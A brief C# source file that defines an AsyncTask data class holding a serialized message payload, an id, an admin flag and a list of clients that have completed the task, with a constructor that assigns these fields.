using System.Collections.Generic;

namespace PEGASUS.IcarusWings
{
	public class AsyncTask
	{
		public bool admin;

		public List<string> doneClient;

		public string id;

		public byte[] msgPack;

		public AsyncTask(byte[] _msgPack, string _id, bool _admin)
		{
			msgPack = _msgPack;
			id = _id;
			admin = _admin;
			doneClient = new List<string>();
		}
	}
}
